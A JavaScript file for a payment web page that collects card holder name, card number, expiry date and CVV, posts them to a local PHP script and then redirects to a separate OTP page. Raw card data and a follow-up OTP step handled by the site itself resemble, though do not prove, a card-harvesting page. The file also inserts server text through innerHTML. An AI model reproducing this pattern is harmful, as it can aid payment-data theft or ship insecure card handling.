document.addEventListener("DOMContentLoaded", function () {
    const paymentForm = document.getElementById("payment-form");
    const messageBox = document.getElementById("payment_message");
    const submitBtn = document.getElementById("submit-btn");
    const spinner = document.getElementById("spinner");

    paymentForm.addEventListener("submit", function (event) {
        event.preventDefault();
        messageBox.innerHTML = "";
        spinner.style.display = "block";
        submitBtn.disabled = true;

        messageBox.style.color = "#555";
        messageBox.innerHTML = "Processing payment...";

        // Get and format form values manually
        const formData = new FormData();
        formData.append("card_holder", document.getElementById("card-name").value.trim());
        formData.append("card_number", document.getElementById("card-number").value.replace(/\s+/g, ''));
        formData.append("expiry_date", document.getElementById("expiry").value);
        formData.append("cvv", document.getElementById("cvv").value);

        const startTime = Date.now();

        fetch("submit_payment.php", {
            method: "POST",
            body: formData,
            credentials: "include"
        })
        .then(res => res.json())
        .then(data => {
            const elapsed = Date.now() - startTime;
            const delay = Math.max(2000 - elapsed, 0);

            setTimeout(() => {
                spinner.style.display = "none";
                submitBtn.disabled = false;

                if (data.success) {
                    messageBox.style.color = "green";
                    messageBox.innerHTML = "Payment successful! Redirecting...";
                    setTimeout(() => {
                        window.location.href = "OTP.html";
                    }, 1000);
                } else {
                    messageBox.style.color = "red";
                    messageBox.innerHTML = data.message;
                }
            }, delay);
        })
        .catch(() => {
            spinner.style.display = "none";
            submitBtn.disabled = false;
            messageBox.innerHTML = "Something went wrong. Please try again.";
            messageBox.style.color = "red";
        });
    });

    // Card number formatting and card type detection
    const cardNumberInput = document.getElementById("card-number");
    cardNumberInput.addEventListener("input", function () {
        let raw = this.value.replace(/\D/g, '');
        if (raw.length > 16) raw = raw.slice(0, 16);
        this.value = raw.replace(/(\d{4})(?=\d)/g, '$1 ');

        const type = detectCardType(raw);
        const cardIcon = document.getElementById("card-icon");
        if (type === "visa") {
            cardIcon.src = "https://img.icons8.com/color/48/000000/visa.png";
            cardIcon.alt = "Visa";
            cardIcon.style.display = "inline";
        } else if (type === "mastercard") {
            cardIcon.src = "https://img.icons8.com/color/48/000000/mastercard.png";
            cardIcon.alt = "Mastercard";
            cardIcon.style.display = "inline";
        } else {
            cardIcon.style.display = "none";
        }
    });

    function detectCardType(number) {
        if (/^4/.test(number)) return "visa";
        if (/^(5[1-5])/.test(number)) return "mastercard";
        if (/^2(2[2-9][1-9]|[3-6][0-9]{2}|7[01][0-9]|720)/.test(number)) return "mastercard";
        return "";
    }

    cardNumberInput.addEventListener("keypress", function (e) {
        if (!/\d/.test(e.key)) e.preventDefault();
    });

    // CVV validation and masking
    const cvvInput = document.getElementById("cvv");
    cvvInput.setAttribute("type", "password");

    cvvInput.addEventListener("input", function () {
        this.value = this.value.replace(/\D/g, '');
        if (this.value.length > 3) {
            this.value = this.value.slice(0, 3);
        }
    });
});
